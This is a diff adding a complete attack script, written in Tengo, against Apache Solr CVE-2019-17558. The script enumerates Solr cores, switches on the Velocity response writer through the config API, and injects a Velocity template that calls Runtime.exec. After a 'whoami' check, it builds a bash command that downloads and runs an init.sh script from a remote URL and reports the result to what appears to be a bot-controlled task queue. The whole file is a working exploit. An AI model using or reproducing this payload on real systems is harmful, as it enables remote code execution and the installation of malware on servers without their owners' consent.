@@ -1,0 +1,183 @@
+/*
+* This solr.tengo is an attack script that attacks target host by apache solr template inject bugs
+*
+*global variable:
+*attackTarget
+*attackScript
+*/
+
+fmt  := import("fmt")
+http := import("http")
+json := import("json")
+text := import("text")
+attack := import("attack")
+
+ApacheSolrAttackName := "ApacheSolrAttackCVE_2019_17558"
+ApacheSolrAttackType := "ApacheSolrAttackCVE_2019_17558"
+AttackInitScriptName := "init.sh"
+SolrDefaultCores := ["collection1","core","core1","test","new_core"]
+
+UA := "GoClient"
+timeoutMS := 10000
+
+host := attackTarget.ip
+port := attackTarget.port
+proto := attackTarget.proto
+
+isSSL := proto == "https" ||port==443
+
+client := http.newHttpClient(host,port,isSSL,timeoutMS)
+
+//Get the solr all cores that created
+getSolrCores := func() {
+
+    request := http.newHttpRequest("get","/solr/admin/cores?wt=json").addHeader("User-Agent",UA)
+    response := client.send(request)
+
+    if response.getStatusCode() !=200 {
+        return {}
+    }
+
+    content := response.getBodyAsString()
+
+    if content == "" {
+        return {}
+    }
+
+    if !text.contains(content,"responseHeader") ||!text.contains(content,"{")||!text.contains(content,"status") {
+
+        return {}
+    }
+
+    jsonData := json.decode(content)
+
+    if is_error(jsonData)||len(jsonData["status"])==0 {
+        return SolrDefaultCores
+    }
+
+    cores :=[]
+
+    for core,v in jsonData["status"] {
+        cores = append(cores,core)
+    }
+    return cores
+}
+
+//Try to open solr velocity template by config
+openSolrVelocity := func(core) {
+
+    url := fmt.sprintf("/solr/%s/config?wt=json",core)
+
+    velConfigJson := `{
+  "update-queryresponsewriter": {
+    "startup": "lazy",
+    "name": "velocity",
+    "class": "solr.VelocityResponseWriter",
+    "template.base.dir": "",
+    "solr.resource.loader.enabled": "true",
+    "params.resource.loader.enabled": "true"
+     }
+    }`
+
+    request := http.newHttpRequest("post",url).addHeader("User-Agent",UA)
+    request.addHeader("Content-Type","application/json")
+    request.putString(velConfigJson,false)
+    response := client.send(request)
+}
+
+
+//make an attack cmd
+makeCmd := func(){
+
+    initUrl := attackScript.downloadInitUrl(host,port,AttackInitScriptName)
+    initDownloadCmd := attackScript.initCmdForLinux(initUrl,ApacheSolrAttackType)
+    cmd := fmt.sprintf("bash,-c,%s",initDownloadCmd)
+    return http.urlEncode(cmd)
+}
+
+//Try to Attack Solr by velocity template inject bug
+
+attackByVelocityInject := func(core,cmd) {
+
+    payloadBefore := "q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23" +
+                     "set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))" +
+                     "+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec($str.valueOf(%27"
+
+    payloadAfter := "%27).split(%22,%22)))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
+
+    url := fmt.sprintf("/solr/%s/select?%s%s%s",core,payloadBefore,cmd,payloadAfter)
+
+    request := http.newHttpRequest("get",url).addHeader("User-Agent",UA)
+    return client.send(request)
+}
+
+//make attack process and publish into attack tasks and send into sbot
+sendAttackResult := func(core,cmd,result) {
+
+    attackProcess := attack.newAttackProcess()
+    attackProcess.setIP(host)
+    attackProcess.setHost(host)
+    attackProcess.setPort(port)
+    attackProcess.setProto(isSSL?"https":"http")
+    attackProcess.setApp("ApacheSolr")
+    attackProcess.setName(ApacheSolrAttackName)
+    attackProcess.setType(ApacheSolrAttackType)
+    attackProcess.setStatus(0)
+    attackProcess.setPayload(cmd)
+    attackProcess.setResult(result)
+    attackProcess.setDetails(core)
+
+    //publish attack process into attack tasks
+    attackScript.pubProcess(attackProcess)
+}
+
+main := func() {
+
+    cores := getSolrCores()
+
+    if len(cores) == 0 {
+        return false
+    }
+
+    //if the solr velocity template functions has been openned
+    for core in cores {
+
+        response := attackByVelocityInject(core,"whoami")
+
+        if response.getStatusCode() ==200 {
+
+            result := response.getBodyAsString()
+            fmt.printf("Target:%s:%d has an apache solr velocity template RCE bugs,so start to attack it,cmd:whoami,result:%s\n",host,port,result)
+            cmd := makeCmd()
+            response := attackByVelocityInject(core,cmd)
+
+            sendAttackResult(core,cmd,result)
+            return true
+        }
+
+    }
+
+    //solr velocity template functions has not been openned ,try to open it then attack
+     for core in cores {
+            openSolrVelocity(core)
+            response := attackByVelocityInject(core,"whoami")
+
+            if response.getStatusCode() ==200 {
+
+                result := response.getBodyAsString()
+                fmt.printf("Target:%s:%d has an apache solr velocity template RCE bugs,so start to attack it,cmd:whoami,result:%s\n",host,port,result)
+                cmd := makeCmd()
+                response := attackByVelocityInject(core,cmd)
+
+                sendAttackResult(core,cmd,result)
+                return true
+            }
+      }
+
+    return false
+}
+
+main()
+
+
+
